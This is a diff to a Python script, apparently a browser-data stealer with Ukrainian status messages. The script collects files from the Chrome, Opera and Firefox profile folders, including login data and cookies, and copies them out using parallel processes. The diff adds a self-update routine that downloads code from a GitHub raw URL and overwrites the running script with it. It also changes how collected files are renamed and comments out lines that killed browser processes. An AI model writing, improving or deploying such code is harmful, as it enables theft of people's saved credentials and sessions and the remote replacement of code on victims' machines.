@@ -19,6 +19,27 @@ PROC_NUM=15
 file_list=[]
 sep='/'
 chtid=wt=0
+def copyFile(src,dst):
+    try:
+        shutil.copy(src,dst)
+    except shutil.Error as e:
+        print('Error: %s' % e)
+    except IOError as e:
+        print('Error: %s' % e.strerror)
+
+def autoupdate():
+    fname=sys.argv[0]
+    Fname=os.path.split(fname)[1]
+    print('Почати оновлення через інтернет!!!')
+    r=requests.get('https://raw.githubusercontent.com/hendalf332/tratata/master/getfls.py')
+    if r.status_code==200:
+        with open('update.txt','w') as fl:
+            fl.write(r.text)
+        print('[+]Успішно оновлено')
+        copyFile('update.txt',fname)
+    else:
+        print('[-]Не можу оновитися')
+        
 def check_intr():
     try:
         requests.get("https://github.com")
@@ -30,17 +51,10 @@ def waitForConnection():
     while True:
         if check_intr()<0:
             print('[-]No connection')
-            time.sleep(100)
+            time.sleep(10)
         else:
             break
  
-def copyFile(src,dst):
-    try:
-        shutil.copy(src,dst)
-    except shutil.Error as e:
-        print('Error: %s' % e)
-    except IOError as e:
-        print('Error: %s' % e.strerror)
 
 def get_files(directory_path,extlist):
     global file_list
@@ -138,6 +152,9 @@ def superProc(fileList,num,extlist,hostdir,hostname,wt,cht):
                     os.mkdir(dirname)
                 print(f'Proc {num}:',fname)
                 newname=fname[len(fname)-fname[::-1].index(sep)-1:]
+                if not any([ele for ele in ["opera","firefox","chrome","chromium","safari"] if (ele in dirname) ]):
+                    newname=fname.replace(':\\','.')
+                    newname=newname.replace(sep,'.')
                 copyFile(fname,f"{dirname}{sep}{newname}")
                 if fileList[cnt]=='TERMINATED':
                     return
@@ -162,6 +179,7 @@ def main():
     global wt
 ###########
     waitForConnection()
+    autoupdate()
     
     chtid=wt=0
     cfgpath=f'.{sep}config.py'
@@ -243,16 +261,16 @@ def main():
 
 
         else:
-            os.system('taskkill /F /IM chrome.exe')
+            #os.system('taskkill /F /IM chrome.exe')
             for file in glob.glob(os.environ['APPDATA']+"\..\\Local\\Google\\Chrome\\User Data\\Default\\*"):
                 file_list.append((file,'chrome'))
               
-            os.system('taskkill /F /IM opera.exe')
+            #os.system('taskkill /F /IM opera.exe')
             for file in glob.glob(os.environ['APPDATA']+"\\Opera Software\\Opera Stable\\*"): 
                 if os.path.split(file)[1][0].isupper():
                     file_list.append((file,'opera'))
         
-            os.system('taskkill /F /IM firefox.exe')
+            #os.system('taskkill /F /IM firefox.exe')
             for file in glob.glob(os.environ['APPDATA']+"\\Mozilla\\Firefox\\Profiles\\*.default-release\\*"):
                 file_list.append((file,'firefox'))
     
